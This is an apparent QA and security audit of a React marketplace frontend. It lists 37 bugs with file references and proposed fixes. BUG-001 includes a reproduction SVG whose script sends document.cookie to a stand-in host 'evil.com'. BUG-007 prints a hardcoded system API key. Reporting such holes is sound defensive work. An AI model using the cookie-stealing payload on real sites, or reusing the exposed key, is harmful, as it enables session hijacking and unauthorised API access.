# Green-Bidz Platform — Deep QA Report (Full Code Audit)
**Project:** 101lab-2 (Green-Bidz Frontend)  
**Date:** April 17, 2026  
**Method:** Full source-file read of every critical file (Auth, Upload, Routes, API slices, Hooks, Services, App)  
**Files Read:** Auth.tsx, ForgotPassword.tsx, BulkUpload.tsx, UploadMethod.tsx, Checkout.tsx, MakeBiddingOfferModal.tsx, Step1.tsx, ProtectedRoute.tsx, AdminRoute.tsx, SellerPermissionRoute.tsx, GuestRoute.tsx, baseQuery.ts, axiosInstance.ts, apiSlice.ts, productSlice.ts, useSellerPermissions.ts, socket.ts, App.tsx, BuyerMarketplace.tsx, BiddingAndInspectionStep.tsx (20+ files, 8000+ lines read)

---

## Summary

| Severity | Count |
|----------|-------|
| 🔴 Critical | 8 |
| 🟠 High | 12 |
| 🟡 Medium | 10 |
| 🟢 Low | 7 |
| **Total** | **37** |

---

## 🔴 CRITICAL

---

### BUG-001 — SVG File Upload Not Blocked (XSS Security Vulnerability)
**Files:**
- `src/pages/dashboard/BulkUpload.tsx:335`
- `src/components/steps/Step1.tsx:189–192`
- `src/pages/Seller/MakeBiddingOfferModal.tsx:55`
- `src/pages/dashboard/BulkUpload.tsx:866,883` (`accept="image/*"`)

**Description:**  
In BulkUpload, image validation is `blob.type.startsWith("image/")` — SVG files have MIME type `image/svg+xml`, which starts with `"image/"`, so they pass. In Step1, the check is `file.type.startsWith('image/')` — same result. SVG files can contain embedded `<script>` tags and JavaScript event handlers, making this a stored XSS vulnerability.

**Steps to Reproduce:**
1. Create `evil.svg` with content:  
   `<svg><script>fetch('https://evil.com?c='+document.cookie)</script></svg>`
2. Upload it in bulk upload image column or Step1 media upload
3. If rendered as an `<img>` tag anywhere in the platform, the script executes in viewer's browser

**Expected:** "File type not supported. Allowed types: JPG, PNG, WebP, GIF."  
**Actual:** SVG accepted, uploaded silently

**Current Code (BulkUpload.tsx:335):**
```tsx
if (!blob.size || !blob.type.startsWith("image/")) continue; // SVG passes!
```

**Fix:**
```tsx
const BLOCKED_MIME = ["image/svg+xml", "image/svg", "image/x-svg"];
if (!blob.size || !blob.type.startsWith("image/") || BLOCKED_MIME.includes(blob.type)) {
  rowErrors.push(`Image at URL skipped: SVG or unsupported type (${blob.type})`);
  continue;
}
```

---

### BUG-002 — `userId` Used Without Null Check Across Upload & API Calls
**Files:**  
- `src/pages/dashboard/BulkUpload.tsx:368, 557, 598`  
- `src/rtk/slices/apiSlice.ts:361, 419, 440, 466, 478`

**Description:**  
`userId` is read from `localStorage.getItem("userId")` and used directly without checking if it's null. In BulkUpload, `userId || ""` sends an empty string as `post_author_id`, creating products with no owner. In `apiSlice.ts`, `getUserTypeAndRole` and other queries pass `userId` directly into URL params with no null guard.

In `Checkout.tsx:135`:  
```tsx
buyer_id: Number(localStorage.getItem('userId')), // Number(null) = 0
```
`Number(null)` evaluates to `0`, which is an invalid buyer ID.

**Steps to Reproduce:**
1. Log in, start a bulk upload
2. Open DevTools → Application → Clear Site Data (or just clear localStorage)
3. Click Upload — products are created with `post_author_id: ""` or `buyer_id: 0`

**Expected:** Stop upload with "Session expired. Please log in again."  
**Actual:** Creates orphaned products with no owner

**Fix (BulkUpload.tsx:368):**
```tsx
const userId = localStorage.getItem("userId");
if (!userId) { toastError("Session expired. Please log in again."); return; }
```

---

### BUG-003 — Tokens NOT Cleared When Auth Fails in ProtectedRoute
**File:** `src/context/ProtectedRoute.tsx:26–27`

**Description:**  
When the API returns `isError || !data?.success`, the route redirects to `/auth`. However, the `accessToken`, `refreshToken`, and `userId` are still in localStorage. An attacker or a stale session can still make direct API calls using these tokens even after the route redirects.

**Current Code:**
```tsx
if (isError || !data?.success)
  return <Navigate to="/auth" replace />; // tokens NOT cleared
```

**Fix:**
```tsx
if (isError || !data?.success) {
  ["accessToken","refreshToken","userId","userRole","jwtRole","activeView"].forEach(k => localStorage.removeItem(k));
  return <Navigate to="/auth" replace />;
}
```

---

### BUG-004 — `@ts-nocheck` Disables TypeScript in Critical Files
**Files:**  
- `src/pages/auth/Auth.tsx:1`  
- `src/pages/auth/ForgotPassword.tsx:1`  
- `src/pages/Seller/Checkout.tsx:1`  
- `src/pages/marketplace/BuyerMarketplace.tsx:1`

**Description:**  
`// @ts-nocheck` at the top of a file completely disables TypeScript type checking for that file. This hides real type errors (wrong prop types, missing null checks, incorrect API response shapes) at compile time, letting them become runtime crashes in production.

**Example of hidden crash (Checkout.tsx):**  
- `batch.seller_id` — `batch` defaults to `{}` on line 43, `{}.seller_id` is `undefined`. TypeScript would catch this, but `@ts-nocheck` suppresses the warning.
- `product.meta?.find(...)` — `product` defaults to `{}`, `{}.meta` is `undefined`.

**Fix:** Remove `// @ts-nocheck` from all four files and resolve the type errors properly.

---

### BUG-005 — Dead Code After `return` in `useSellerPermissions` (Wrong Default Role)
**File:** `src/hooks/useSellerPermissions.ts:244–254`

**Description:**  
The `sellerRole` computation has a `return 'product_manager'` on line 245 inside the `useMemo`. All fallback logic below this return (including the final `return 'product_viewer'`) is UNREACHABLE dead code. This means every company-mode user who has no explicit role assigned gets `product_manager` permissions instead of the intended `product_viewer`.

**Unreachable lines (never execute):**
```tsx
return 'product_manager' as SellerRole;  // ← ALWAYS returns here

// These lines NEVER run:
if (user?.seller_role) return user.seller_role as SellerRole;
const testRole = localStorage.getItem('sellerRole');
if (testRole && ...) return testRole as SellerRole;
return 'product_viewer' as SellerRole;  // ← intended default, unreachable
```

**Impact:** Users without an assigned role silently get `product_manager` access (can edit products) instead of `product_viewer` (read-only).

**Fix:** Remove the early return and restore the intended fallback chain.

---

### BUG-006 — `SellerNotificationListener` Always Runs for ALL Users (Including Buyers/Admins)
**File:** `src/App.tsx:172`

**Description:**  
`isSeller={true}` is hardcoded in `SellerNotificationListener`. This means the listener runs for buyers and admins too, subscribing them to seller socket events they should not receive.

**Current Code:**
```tsx
<SellerNotificationListener sellerId={userId} isSeller={true} />
```

**Fix:**
```tsx
const userRole = localStorage.getItem("userRole");
<SellerNotificationListener sellerId={userId} isSeller={userRole === "seller"} />
```

---

### BUG-007 — `x-system-key` Hardcoded in `productSlice.ts` (Not Using Env Variable)
**File:** `src/rtk/slices/productSlice.ts:224, 233, 243, 247, 283, 296, 307`

**Description:**  
The API key `"fa39812fec"` is hardcoded directly in multiple query definitions. This means:
1. The key is exposed in the JavaScript bundle (visible in DevTools → Sources)
2. If the key changes, it must be updated in multiple places
3. It differs from the key used in `axiosInstance.ts` which reads from `import.meta.env.VITE_X_SYSTEM_KEY`

**Current Code:**
```tsx
headers: { "x-system-key": "fa39812fec" },  // hardcoded
```

**Fix:**
```tsx
headers: { "x-system-key": import.meta.env.VITE_X_SYSTEM_KEY },
```

---

### BUG-008 — `BulkUpload` Uses Raw `axios` (Bypasses `axiosInstance` Interceptors)
**File:** `src/pages/dashboard/BulkUpload.tsx:369, 581–584`

**Description:**  
`BulkUpload` imports and uses raw `axios` directly for product creation:
```tsx
import axios from "axios";
const baseURL = import.meta.env.VITE_PRODUCTION_URL;
const response = await axios.post(`${baseURL}wp/create-product...`, formData, ...);
```
This bypasses `axiosInstance` entirely, meaning:
1. No automatic `x-system-key` header (must rely on form data alone)
2. No interceptors for auth error handling
3. Always hits the production URL, even in development (CORS issue)
4. `withCredentials` is not set

**Fix:** Use `axiosInstance` from `@/rtk/api/axiosInstance` instead of raw `axios`.

---

## 🟠 HIGH

---

### BUG-009 — Socket Join Failure Silent (No Error Handling)
**Files:** `src/pages/auth/Auth.tsx:207–209`, `src/App.tsx:160–164`

**Description:**  
In both Auth.tsx (on login) and App.tsx (on mount), `socket.emit("joinRooms", ...)` is called with a callback. If `res.success` is false, there is no error handling. The user sees a successful login but receives no real-time events (bids, messages, auction updates).

**Auth.tsx:**
```tsx
socket.emit("joinRooms", { user_id: userId, role }, (res) => {
  if (res.success) console.log("Socket rooms joined successfully");
  // No else — silent failure
});
```
**App.tsx:**
```tsx
socket.emit("joinRooms", { user_id: userId, role }, (res) => {
  console.log("Rejoin rooms:", res); // Just logs, no handling
});
```

**Fix:** Show a dismissable warning toast if room join fails.

---

### BUG-010 — `UploadMethod` File Upload Input Has No `accept` Attribute (Accepts Executables)
**File:** `src/pages/dashboard/UploadMethod.tsx:389–393`

**Description:**  
The "Upload Inventory" file input has no `accept` attribute and no type checking in the handler:
```tsx
<input
  type="file"
  id={`file-upload-${item.id}`}
  onChange={handleFileUpload}
  className="hidden"
/>
// handler just does: setUploadedFile(file); toast.success(...)
```
Any file type, including `.exe`, `.sh`, `.bat`, can be selected. The `uploadedFile` state is then stored but never validated or submitted anywhere (see BUG-011).

**Fix:** Add `accept=".pdf,.doc,.docx,.xlsx,.xls,.csv"` and validate MIME type in handler.

---

### BUG-011 — `UploadMethod` Form Data Is Never Submitted to API
**File:** `src/pages/dashboard/UploadMethod.tsx:241–262`

**Description:**  
The `handleConfirm` function validates the form and calls `navigate("/inspection-price")` — but passes NO navigation state. All collected `items` (titles, categories, media, locations, prices) are lost on navigation. The next page has no data to work with.

```tsx
const handleConfirm = () => {
  // validates...
  toast.success(t('steps.step1.inventoryConfirmed'));
  navigate("/inspection-price"); // no state passed!
};
```

The `/inspection-price` route receives empty state, so the next steps in the listing flow are effectively broken for the UploadMethod path.

**Fix:** Pass form data via navigation state:
```tsx
navigate("/inspection-price", { state: { items } });
```

---

### BUG-012 — `GuestRoute` Redirects Logged-In Admin to `/forbidden` Instead of `/admin`
**File:** `src/context/GuestRoute.tsx:18–20`

**Description:**  
If an already logged-in admin visits `/auth`, GuestRoute detects `role !== "seller"` and `role !== "buyer"`, and falls to:
```tsx
return <Navigate to="/forbidden" replace />;
```
This means admin users are told they're "unauthorized" when they simply navigated to login while already authenticated. They should be redirected to `/admin`.

**Fix:**
```tsx
if (role === "seller") return <Navigate to="/dashboard" replace />;
if (role === "buyer") return <Navigate to="/buyer-dashboard" replace />;
if (role === "admin") return <Navigate to="/admin" replace />;
return <Navigate to="/forbidden" replace />;
```

---

### BUG-013 — Silent Catch on Image URL Fetch (User Gets No Feedback)
**File:** `src/pages/dashboard/BulkUpload.tsx:340–341`

**Description:**  
When an image URL fails to load (CORS, 404, timeout, invalid URL):
```tsx
} catch {
  /* CORS or network */
}
```
The error is silently swallowed. The product is created with no image and the user has no idea why. This is exactly the issue described in your bug report — "failed to generate AI" style generic errors.

**Fix:** Track per-URL failures and show in the results row:
```tsx
} catch (fetchErr) {
  urlFetchErrors.push(`Image "${url}" failed: CORS or invalid URL`);
}
// After upload, show: "Row 3 uploaded successfully (2/3 images loaded; 1 URL failed - CORS or invalid)"
```

---

### BUG-014 — Silent Catch on Batch Creation Failure (Partial Success Not Communicated)
**File:** `src/pages/dashboard/BulkUpload.tsx:606–607`

**Description:**  
After product creation succeeds, batch creation can fail silently:
```tsx
} catch {
  /* batch failed — product still created */
}
```
The row shows as ✅ "success" but the product has no batch — it's an orphan and won't appear in the seller's batch listing.

**Fix:** Show a warning instead of success when batch fails:
```tsx
} catch (batchErr) {
  setResults(prev => prev.map(r =>
    r.rowNum === row.rowNum
      ? { ...r, status: "success", message: "Product created but batch assignment failed — assign manually from Submissions" }
      : r
  ));
}
```

---

### BUG-015 — `parseSheet` Error Uses `alert()` (Not Toast, Not i18n)
**File:** `src/pages/dashboard/BulkUpload.tsx:461`

**Description:**  
When the Excel sheet fails to parse:
```tsx
} catch {
  alert("Could not parse file. Please use the downloaded template.");
}
```
This uses a browser `alert()` — which:
1. Blocks the UI thread
2. Cannot be styled or dismissed gracefully
3. Is NOT translated (hardcoded English string)
4. Inconsistent with the `toastError()` pattern used everywhere else

**Fix:**
```tsx
} catch {
  toastError(t('bulkUpload.parseError'));
}
```

---

### BUG-016 — `AdminRoute` Has Unused Dead Token Variables
**File:** `src/context/AdminRoute.tsx:17–18`

**Description:**  
```tsx
const accessToken = getCookie("accessToken");
const refreshToken = getCookie("refreshToken");
```
These two variables are declared, read from cookies, and then NEVER USED. The actual auth check uses `useVerifyUserQuery`. This is dead code left over from copy-paste, and the `getCookie` function (also defined in this file) duplicates a function also in `apiSlice.ts`.

**Impact:** Creates confusion about which token storage is authoritative (cookies vs localStorage).

**Fix:** Remove the unused variables and the duplicate `getCookie` function.

---

### BUG-017 — No File Size Limit on Any Upload in the Entire Platform
**Files:**  
- `BulkUpload.tsx:330–344` (URL fetch)  
- `Step1.tsx:169–230` (media upload)  
- `MakeBiddingOfferModal.tsx:51–65` (document upload)

**Description:**  
No component checks file size before uploading. A user can upload or link to a 1GB file, which will:
1. Download into browser memory (for URL-based images)
2. Be sent to the server without size check
3. Potentially cause tab crash or server-side memory issues

**Fix (add to all handlers):**
```tsx
const MAX_SIZE_MB = 10;
if (file.size > MAX_SIZE_MB * 1024 * 1024) {
  toast.error(`File too large. Max ${MAX_SIZE_MB}MB allowed.`);
  return;
}
```

---

### BUG-018 — No Password Strength Requirement (Both Signup & Reset)
**Files:**  
- `src/pages/auth/Auth.tsx:121`  
- `src/pages/auth/ForgotPassword.tsx:105`

**Description:**  
Both signup and password reset only require `length >= 6`. Passwords like `aaaaaa`, `123456`, `password` are fully accepted. This puts users at risk from credential stuffing attacks.

**Fix:**
```tsx
const PASSWORD_REGEX = /^(?=.*[A-Z])(?=.*\d).{8,}$/;
if (!PASSWORD_REGEX.test(password)) {
  toastWarning("Password needs 8+ chars, one uppercase, one number.");
  return;
}
```

---

### BUG-019 — `MakeBiddingOfferModal` Has No Validation Before Submit
**File:** `src/pages/Seller/MakeBiddingOfferModal.tsx:67–111`

**Description:**  
The submit handler only checks `if (!userId)`. No other validation:
- `company_name` is required (has `required` attr) but can be whitespace-only
- `amount` field: can submit `0`, `-100`, or non-numeric (HTML `type="number"` doesn't prevent all edge cases)
- No file size or type validation for `document_image`
- Submit button has no debounce — double-clicking can create duplicate offers

**Fix:**
```tsx
if (!formData.company_name.trim()) {
  toast.error("Company name is required.");
  return;
}
const amount = Number(formData.amount);
if (formData.amount && (isNaN(amount) || amount <= 0)) {
  toast.error("Offer amount must be a positive number.");
  return;
}
```

---

### BUG-020 — Checkout `buyer_id: Number(null) = 0` When Not Logged In
**File:** `src/pages/Seller/Checkout.tsx:135`

**Description:**  
```tsx
buyer_id: Number(localStorage.getItem('userId')),
```
When `userId` is not in localStorage, `localStorage.getItem('userId')` returns `null`, and `Number(null)` evaluates to `0`. The API receives `buyer_id: 0`, which is an invalid buyer.

Also on the same line:
```tsx
seller_id: batch.seller_id,
```
`batch` defaults to `{}` (line 43), so `batch.seller_id` is `undefined`.

**Fix:**
```tsx
const buyerId = Number(localStorage.getItem('userId'));
if (!buyerId) { navigate('/auth'); return; }
const sellerId = batch?.seller_id;
if (!sellerId) { toast.error('Invalid listing data.'); return; }
```

---

## 🟡 MEDIUM

---

### BUG-021 — Multiple `console.log` Debug Statements in Production Code
**Files:**

| File | Lines | Content |
|------|-------|---------|
| `BuyerMarketplace.tsx` | 63, 127 | `console.log('🔍 DEBUG: selectedGroup =', ...)` |
| `SellerPermissionRoute.tsx` | 33, 56, 59, 68, 72 | Logs user role, permission status |
| `useSellerPermissions.ts` | 225, 229, 233, 240, 244, 259, 312, 317 | Logs sensitive role data |
| `Auth.tsx` | 208 | `console.log("Socket rooms joined successfully")` |
| `App.tsx` | 162 | `console.log("Rejoin rooms:", res)` |
| `socket.ts` | 18, 22 | Socket connect/disconnect logs |

**Impact:** Role and permission data is visible to any user who opens DevTools. Debug logs slow down the browser and pollute monitoring tools (Sentry, DataDog).

---

### BUG-022 — `App.tsx` Socket `joinRooms` Called on Every Mount (No Cleanup)
**File:** `src/App.tsx:154–165`

**Description:**  
The `useEffect` that calls `socket.joinRooms` has an empty dependency array `[]` and no cleanup function. In React StrictMode (development), effects run twice. In production, if the `App` component ever re-mounts, it fires a second join without leaving the first rooms, potentially causing duplicate event deliveries.

Also: the socket in `socket.ts` is a module-level singleton (`let socket: Socket`), but `getSocket()` is called in multiple `useEffect`s with no tracking of already-joined rooms.

---

### BUG-023 — Category Validation Only Checks Truthy (Not Against Loaded List)
**File:** `src/pages/dashboard/BulkUpload.tsx:530`

**Description:**  
```tsx
const invalid = rows.find((r) => !r.categoryId);
```
Only checks if `categoryId` is truthy. It does not verify the value is a valid slug from `apiCategories`. If categories fail to load and fall back to the empty list, a manually typed or stale slug passes validation and goes to the API.

---

### BUG-024 — `BiddingAndInspectionStep` Starts Bid Date as Current `new Date()` (Past Date)
**File:** `src/pages/dashboard/BiddingAndInspectionStep.tsx:85–86`

**Description:**  
```tsx
const [biddingStartDate, setBiddingStartDate] = useState<Date>(new Date());
const [biddingEndDate, setBiddingEndDate] = useState<Date>(new Date());
```
Both default to right now. If a seller doesn't change the dates and submits, they create a bid that starts and ends in the past. No validation prevents past-date submission.

**Fix:** Default to future dates (e.g., +7 days for start, +14 days for end) and add a date validator.

---

### BUG-025 — `UploadMethod` Price Validation Only for UI — "Fixed Price" Value Never Validated
**File:** `src/pages/dashboard/UploadMethod.tsx:241–260`

**Description:**  
`handleConfirm` checks `!item.title`, `!item.condition`, `!item.operationStatus`, but does NOT validate:
- If `priceType === "fixed"` and `estimatedValue` is empty or non-numeric
- The `estimatedValue` input accepts a number but doesn't prevent negative values or zero

---

### BUG-026 — `GuestRoute` Shows Raw `<div>` for Non-401 Server Errors
**File:** `src/context/GuestRoute.tsx:29`

**Description:**  
```tsx
return <div>Something went wrong. Please try again later.</div>;
```
No layout, no styling, no navigation option. User is stranded on a blank page if the verify API returns a 500 error during login page load.

---

### BUG-027 — `apiSlice.getUserTypeAndRole` Has Complex localStorage Logic in Query Function
**File:** `src/rtk/slices/apiSlice.ts:358–413`

**Description:**  
The `query` function for `getUserTypeAndRole` reads from `localStorage` and performs conditional logic to build the URL. RTK Query's `query` function should be a pure function that takes arguments, not read from side-effect sources. This makes the query:
1. Non-deterministic (cache invalidation won't trigger on localStorage changes)
2. Hard to test
3. Called with stale values if localStorage changes after mount

---

### BUG-028 — `UploadMethod` Labels Mix Languages (English + Chinese in Same Label)
**File:** `src/pages/dashboard/UploadMethod.tsx:538, 557, 574, 620`

**Description:**  
Multiple labels have both English and Chinese hardcoded inline:
```tsx
<Label>Condition 狀況 *</Label>
<Label>Operation Status 操作狀態 *</Label>
<Label>Description 描述</Label>
```
This is a localization anti-pattern. The `i18n` system is already imported and used elsewhere in this file. These labels should use `t('...')`.

---

### BUG-029 — `ForgotPassword` OTP Valid Only for One Session (No Expiry Display)
**File:** `src/pages/auth/ForgotPassword.tsx:86–100`

**Description:**  
After the OTP is sent, no expiration timer is shown to the user. If the OTP expires on the backend (typical: 5–15 minutes), the user gets a generic `"Invalid OTP"` error with no indication of why or that they need to request a new one.

The "Resend code" button exists but has no cooldown — the user can spam it.

---

### BUG-030 — `Checkout` Success Modal Has No Translation
**File:** `src/pages/Seller/Checkout.tsx:57, 291`

**Description:**  
```tsx
message: `Hello 👋, I would like to place an order for ${initialQuantity} of '${product?.title || 'this item'}'.`
```
```tsx
<p>Your order has been placed successfully.</p>
```
The default message sent to sellers and the success modal text are hardcoded English. The platform has i18n support (`useTranslation` is imported and `const { t } = useTranslation()` is declared).

---

## 🟢 LOW

---

### BUG-031 — `AdminRoute.tsx` Has Duplicate `getCookie()` Function
**File:** `src/context/AdminRoute.tsx:5–12` vs `src/rtk/slices/apiSlice.ts:134–138`

Two identical `getCookie` implementations exist in the codebase. The one in AdminRoute reads tokens from cookies but the tokens are stored in localStorage (see Auth.tsx:210–211). The cookie read will always return `null`.

---

### BUG-032 — Three Route Definitions for the Same Checkout Component
**File:** `src/App.tsx:265, 272, 304`

```tsx
<Route path="/dashboard/checkout" element={<Checkout />} />
<Route path="/checkout" element={<CheckoutPage />} />
<Route path="/buyer/checkout" element={<Checkout />} />
```
`Checkout` and `CheckoutPage` import the same file. Three routes for the same component creates confusion and potential navigation inconsistencies.

---

### BUG-033 — `/seo-analytics` and `/ai/chat1` and `/test` Routes Are Unprotected Public Routes
**File:** `src/App.tsx:192, 334, 336`

```tsx
<Route path="/forgot-password" element={<ForgotPassword />} />
<Route path="/seo-analytics" element={<SEOAnalytics />} />
...
<Route path="/ai/chat1" element={<AIChat />} />
<Route path="/test" element={<TestRendeer />} />
```
SEO analytics and test pages should not be publicly accessible. They are outside any `ProtectedRoute`.

---

### BUG-034 — `BulkUpload` Max Image Limit (10) Not Communicated to User
**File:** `src/pages/dashboard/BulkUpload.tsx:286, 330`

The spreadsheet template info row says "max 10" but only in English. Users who use non-English templates see a truncated limit without explanation.

---

### BUG-035 — Lack of `aria-label` / Accessibility on Icon-Only Buttons
**Files:**  
- `BulkUpload.tsx:789–795` — remove photo button has no aria-label  
- `Auth.tsx:378–384` — show/hide password toggle has no aria-label  

Screen readers announce these as unlabeled buttons.

---

### BUG-036 — `socket.ts` Never Disconnects on App Unmount
**File:** `src/services/socket.ts`

The `socket` variable is a module-level singleton. There is no `disconnect()` called anywhere when the user logs out. The socket remains connected, receiving events for the logged-out user, potentially leaking events to a new session if someone logs in on the same browser tab.

---

### BUG-037 — `BuyerMarketplace` `refetch()` Called on Every Filter Change Even When No Filters Applied
**File:** `src/pages/marketplace/BuyerMarketplace.tsx:139–143`

```tsx
useEffect(() => {
  if (debouncedSearch || selectedCategory || selectedCountry || selectedCondition || selectedBidFilter) {
    refetch();
  }
}, [debouncedSearch, selectedCategory, selectedCountry, selectedCondition, selectedBidFilter, refetch]);
```
This fires a manual `refetch()` even though RTK Query already automatically re-runs the query when its parameters change (the `queryParams` object changes). This results in a double API call on every filter change.

---

## Fix Priority Roadmap

### 🔴 Sprint 1 — Security & Critical Correctness (This Week)
| # | File | Fix |
|---|------|-----|
| BUG-001 | `BulkUpload.tsx`, `Step1.tsx`, `MakeBiddingOfferModal.tsx` | Block SVG MIME type in all upload handlers |
| BUG-002 | `BulkUpload.tsx`, `Checkout.tsx` | Null check userId before every API call |
| BUG-003 | `ProtectedRoute.tsx` | Clear tokens on auth failure redirect |
| BUG-004 | `Auth.tsx`, `ForgotPassword.tsx`, `Checkout.tsx`, `BuyerMarketplace.tsx` | Remove `@ts-nocheck` and fix type errors |
| BUG-007 | `productSlice.ts` | Move hardcoded `x-system-key` to env variable |
| BUG-008 | `BulkUpload.tsx` | Replace raw `axios` with `axiosInstance` |

### 🟠 Sprint 2 — High Quality Issues (Next Week)
| # | File | Fix |
|---|------|-----|
| BUG-005 | `useSellerPermissions.ts` | Fix dead code after return statement |
| BUG-006 | `App.tsx` | Fix `isSeller={true}` hardcoded flag |
| BUG-009 | `Auth.tsx`, `App.tsx` | Handle socket join failure |
| BUG-010 | `UploadMethod.tsx` | Add `accept` and MIME type validation |
| BUG-011 | `UploadMethod.tsx` | Pass form state through navigation |
| BUG-012 | `GuestRoute.tsx` | Redirect admin to `/admin` not `/forbidden` |
| BUG-013 | `BulkUpload.tsx` | Show per-URL image fetch errors to user |
| BUG-014 | `BulkUpload.tsx` | Show batch failure warning (not success) |
| BUG-015 | `BulkUpload.tsx` | Replace `alert()` with `toastError()` |
| BUG-016 | `AdminRoute.tsx` | Remove dead token variables |
| BUG-017 | All upload handlers | Add 10MB file size limit |
| BUG-018 | `Auth.tsx`, `ForgotPassword.tsx` | Add password strength requirement |
| BUG-019 | `MakeBiddingOfferModal.tsx` | Add form validation before submit |
| BUG-020 | `Checkout.tsx` | Fix `Number(null) = 0` buyer_id bug |

### 🟡 Sprint 3 — Medium Issues
- BUG-021: Remove all debug console.log statements
- BUG-022: Fix socket room join lifecycle
- BUG-023: Validate categoryId against loaded list
- BUG-024: Default bid dates to future
- BUG-025: Validate fixed price before submit
- BUG-026: Style GuestRoute error state
- BUG-028: Move mixed-language labels to i18n
- BUG-029: Add OTP expiry countdown
- BUG-030: Translate checkout messages

### 🟢 Sprint 4 — Low Priority Polish
- BUG-031–BUG-037: Cleanup, accessibility, socket disconnect, route deduplication

---

## Key Finding: The Original SVG Error Message Issue

Your reported issue — "failed to generate AI" appearing instead of "file type not supported" — is caused by BUG-001 + BUG-013 combined:

1. SVG files pass the `blob.type.startsWith("image/")` check (BUG-001)
2. The backend AI image processing pipeline receives the SVG and throws an internal error
3. The only error path surfaced to the frontend is the backend's generic `message` field (e.g., "failed to generate AI description")
4. The frontend shows whatever `result?.message` says without mapping it to a user-friendly message

**Root fix:** Block SVG at the client before upload. The backend error message is just a symptom.

---

*Report Generated: April 17, 2026 | Green-Bidz 101lab-2 Deep QA Audit | Files read: 20+ | Lines analyzed: 8,000+*
